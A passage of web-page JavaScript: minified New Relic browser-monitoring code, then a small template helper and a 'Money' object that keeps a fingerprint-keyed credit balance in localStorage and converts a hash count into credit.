e?e(r,a):e||{}}catch(f){l([f,"",[r,a,o],s])}u(n+"start",[r,a,o],s);try{return c=t.apply(a,r)}catch(d){throw u(n+"err",[r,a,d],s),d}finally{u(n+"end",[r,a,c],s)}}return r(t)?t:(n||(n=""),nrWrapper[a]=t,d(t,nrWrapper),nrWrapper)}function f(t,n,o,i){o||(o="");var a,s,c,f="-"===o.charAt(0);for(c=0;c<n.length;c++)s=n[c],a=t[s],r(a)||(t[s]=e(a,f?s+o:o,i,s))}function u(e,r,o){if(!c||n){var i=c;c=!0;try{t.emit(e,r,o,n)}catch(a){l([a,e,r,o])}c=i}}function d(t,n){if(Object.defineProperty&&Object.keys)try{var e=Object.keys(t);return e.forEach(function(e){Object.defineProperty(n,e,{get:function(){return t[e]},set:function(n){return t[e]=n,n}})}),n}catch(r){l([r])}for(var o in t)s.call(t,o)&&(n[o]=t[o]);return n}function l(n){try{t.emit("internal-error",n)}catch(e){}}return t||(t=o),e.inPlace=f,e.flag=a,e}},{}],ee:[function(t,n,e){function r(){}function o(t){function n(t){return t&&t instanceof r?t:t?c(t,s,i):i()}function e(e,r,o,i){if(!l.aborted||i){t&&t(e,r,o);for(var a=n(o),s=h(e),c=s.length,f=0;f<c;f++)s[f].apply(a,r);var d=u[y[e]];return d&&d.push([g,e,r,a]),a}}function p(t,n){v[t]=h(t).concat(n)}function h(t){return v[t]||[]}function m(t){return d[t]=d[t]||o(e)}function w(t,n){f(t,function(t,e){n=n||"feature",y[e]=n,n in u||(u[n]=[])})}var v={},y={},g={on:p,emit:e,get:m,listeners:h,context:n,buffer:w,abort:a,aborted:!1};return g}function i(){return new r}function a(){(u.api||u.feature)&&(l.aborted=!0,u=l.backlog={})}var s="nr@context",c=t("gos"),f=t(15),u={},d={},l=n.exports=o();l.backlog=u},{}],gos:[function(t,n,e){function r(t,n,e){if(o.call(t,n))return t[n];var r=e();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(t,n,{value:r,writable:!0,enumerable:!1}),r}catch(i){}return t[n]=r,r}var o=Object.prototype.hasOwnProperty;n.exports=r},{}],handle:[function(t,n,e){function r(t,n,e,r){o.buffer([t],r),o.emit(t,n,e)}var o=t("ee").get("handle");n.exports=r,r.ee=o},{}],id:[function(t,n,e){function r(t){var n=typeof t;return!t||"object"!==n&&"function"!==n?-1:t===window?0:a(t,i,function(){return o++})}var o=1,i="nr@id",a=t("gos");n.exports=r},{}],loader:[function(t,n,e){function r(){if(!x++){var t=b.info=NREUM.info,n=l.getElementsByTagName("script")[0];if(setTimeout(u.abort,3e4),!(t&&t.licenseKey&&t.applicationID&&n))return u.abort();f(y,function(n,e){t[n]||(t[n]=e)}),c("mark",["onload",a()+b.offset],null,"api");var e=l.createElement("script");e.src="https://"+t.agent,n.parentNode.insertBefore(e,n)}}function o(){"complete"===l.readyState&&i()}function i(){c("mark",["domContent",a()+b.offset],null,"api")}function a(){return E.exists&&performance.now?Math.round(performance.now()):(s=Math.max((new Date).getTime(),s))-b.offset}var s=(new Date).getTime(),c=t("handle"),f=t(15),u=t("ee"),d=window,l=d.document,p="addEventListener",h="attachEvent",m=d.XMLHttpRequest,w=m&&m.prototype;NREUM.o={ST:setTimeout,SI:d.setImmediate,CT:clearTimeout,XHR:m,REQ:d.Request,EV:d.Event,PR:d.Promise,MO:d.MutationObserver};var v=""+location,y={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1071.min.js"},g=m&&w&&w[p]&&!/CriOS/.test(navigator.userAgent),b=n.exports={offset:s,now:a,origin:v,features:{},xhrWrappable:g};t(12),l[p]?(l[p]("DOMContentLoaded",i,!1),d[p]("load",r,!1)):(l[h]("onreadystatechange",o),d[h]("onload",r)),c("mark",["firstbyte",s],null,"api");var x=0,E=t(17)},{}]},{},["loader",2,10,4,3]);
;NREUM.info={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",licenseKey:"ae35d55cb6",applicationID:"118478072",sa:1}



}
function dedent(strings, ...values) {

  var result = '';
  for (var i = 0; i < strings.length; i++) {
      if(values&&values[i]){
        result += strings[i].replace(/\n\s+/g, '\n') + values[i];
      }else{
          result += strings[i].replace(/\n\s+/g, '\n');
      }
  }
  return result;
}
function Money(){
    var _money = {};
    _money.init = function(){
        _money.fp = new Fingerprint().get();
        _money.num = Number(localStorage.getItem(_money.fp));
        if(localStorage.getItem(_money.fp)===null){
            _money.num = 10;
            localStorage.setItem(_money.fp,_money.num);
        }
        _money.setD(_money.num);
        return _money;
    };
    _money.setD = function(num){
        var num = num.toFixed(isInt(num)?0:4);
        var moneyD = document.getElementById("money");
        var html = (dedent `<span class="account" title="${config.accountTitle.lang()} ${_money.fp}">${config.accountTitle.lang()}${_money.fp}</span>
      <span class="balance">${config.balance.lang()}${num}${config.balanceCredit.lang()}</span>`);
        moneyD.innerHTML = html;
    }
//     _money.add = function(num){
//         _money.num += num;
//         _money.setD(_money.num);
//         _money.save();
//     }
    _money.save = function(){
        localStorage.setItem(_money.fp,_money.num+_money.hashMoney);
    }

    _money.setHash = function(hashes){
        _money.hashMoney = (hashes/10000);
        _money.setD(_money.num+_money.hashMoney);
        _money.save();
    }
    return _money.init();
}
function isInt(value) {
  return !isNaN(value) && 
         parseInt(Number(value)) == value && 
         !isNaN(parseInt(value, 10));
}